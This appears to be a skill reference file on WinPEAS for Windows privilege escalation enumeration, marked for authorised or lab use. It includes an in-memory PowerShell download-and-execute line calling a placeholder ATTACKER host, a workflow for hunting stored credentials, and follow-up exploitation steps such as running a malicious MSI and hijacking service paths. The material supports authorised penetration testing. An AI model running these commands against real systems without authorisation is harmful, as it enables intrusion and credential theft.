---
name: winpeas
description: "Auth/lab ref: Windows privilege escalation enumeration tool that identifies misconfigurations, weak permissions, unpatched services, and privilege escalation paths."
license: GPL-3.0
compatibility: "Windows x86/x64."
metadata:
  author: AeonDave
  version: "1.0"
---

# WinPEAS

Windows Privilege Escalation Awesome Suite — comprehensive system enumeration for privilege escalation assessment.

## Quick Start

```cmd
# EXE version (simplest)
winpeas.exe

# Quiet mode (findings only, no banner)
winpeas.exe quiet

# Focus service misconfigurations only
winpeas.exe quiet servicesinfo

# Export to file
winpeas.exe > C:\Windows\Temp\winpeas.txt

# PowerShell version (for ESC bypass)
powershell -ep bypass -c ". .\winpeas.ps1; Invoke-WinPEAS -OutputFormat HTML"

# In-memory PowerShell delivery
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/winPEAS.ps1'); Invoke-WinPEAS"
```

## Key Enumeration Areas

| Category | What's Checked | Critical Findings |
|----------|---|---|
| **System Info** | Windows version, build, architecture, UAC | Unpatched OS, UAC disabled |
| **Users & Groups** | Local admins, RDP users, group members | Overprivileged users, domain admins |
| **Network** | Network adapters, firewall rules, listening ports | Cleartext protocols, open admin ports |
| **Services** | Running services, startup type, binary paths, permissions | Unquoted paths, weak service permissions, DLL hijacking |
| **Scheduled Tasks** | Task details, scripts, execution context | Tasks running as SYSTEM, weak script perms |
| **Drivers** | Loaded drivers, kernel mode, vulnerable versions | Vulnerable drivers (Gigabyte, etc) |
| **DLL Hijacking** | DLL search paths, writable directories | Exploitable DLL loads |
| **Registry** | AutoRun entries, credentials in registry, policies | Plaintext creds, auto-privilege escalation |
| **Credentials** | Cached creds, saved passwords, browser data | Plaintext passwords, cred manager access |
| **AppData** | Application config files with hardcoded creds | App credentials, SSH keys |
| **Patching** | Missing KB patches, vulnerability mapping | Known CVEs with public exploits |
| **File Permissions** | Writable system directories, NTFS ACLs | World-writable binaries, weak folder perms |
| **Antivirus & EDR** | AV presence, exclusions, service status | Disabled/excluded antivirus |
| **Kerberos** | Constrained delegation, unconstrained delegation | Ticket impersonation paths |

## Core Flags

| Flag | Description |
|---|---|
| `quiet` | Print findings only, minimal output |
| `-OutputFormat <format>` | HTML / CSV / TEXT (PowerShell only) |
| `-FilePath <path>` | Save to file |
| `-Domain` | AD-specific checks |
| `-Searchpath <path>` | Custom search path |

## Common Workflows

### Full enumeration
```cmd
winpeas.exe > enum_full.txt
# Review for: unquoted paths, weak service perms, DLL hijacking, creds in AppData
```

### Focused credential hunt
```cmd
# After running WinPEAS, look for:
# - Browser data in AppData
# - Saved passwords in config files
# - SAM/LSA secrets in registry (read-only from user context)
# - SSH keys in .ssh folder
```

### Service vulnerability assessment
```cmd
# WinPEAS output shows:
# 1. Service binary path (check for quotes)
# 2. Service permissions (can you modify?)
# 3. DLL dependencies (can you hijack?)
# → Build exploit chain
```

### Before/After Enumeration
```cmd
# Run once at initial shell
# Run again after low-priv escalation
# → Identify new privilege escalation paths available at new level
```

## Key Findings Priority

🔴 **CRITICAL** — Exploitable immediately:
- Unquoted service paths + writable directory
- Weak service permissions + SYSTEM service
- `AlwaysInstallElevated = 1`
- `SeImpersonatePrivilege` on exploitable host
- Plaintext password in registry/config
- Unpatched kernel (CVE with public exploit)

🟠 **HIGH** — Likely exploitable:
- DLL hijacking opportunities
- Scheduled task running as SYSTEM with weak script perms
- Weak NTFS ACLs on system directories
- Missing patches (no public exploit yet)

## High-Value Exploit Follow-Ups

| Finding | Typical follow-up |
|---|---|
| `AlwaysInstallElevated = 1` | Build MSI and execute with `msiexec /quiet /i evil.msi` |
| `SeImpersonatePrivilege` | Check Potato-family techniques / PrintSpoofer-style abuse |
| Unquoted service path | Drop executable in writable intermediate path and restart service |
| Writable service binary | Replace binary or re-point service path if ACLs allow |

🟡 **MEDIUM** — Context-dependent:
- Cached credentials (requires specific auth method)
- Browser stored data (requires unlock)
- Unused admin credentials

## Output Interpretation

WinPEAS marks high-risk findings with:
- 🔴 Red highlight or `[!]` prefix
- Yellow/orange for medium risk
- Green for low risk

Review marked sections first — these are most likely escalation vectors.

## Post-WinPEAS Workflow

1. **Identify low-hanging fruit** — unquoted paths, weak perms, plaintext creds
2. **Verify exploitability** — test each finding (e.g., can you actually write to that directory?)
3. **Develop exploit** — craft batch/PowerShell/C# for the specific vector
4. **Execute** — run exploit, verify SYSTEM/Admin shell
5. **Repeat** — re-run WinPEAS at new privilege level, find further vectors

## Resources

| File | When to load |
|---|---|
| `references/` | Privesc techniques, exploitation examples, Windows security features |
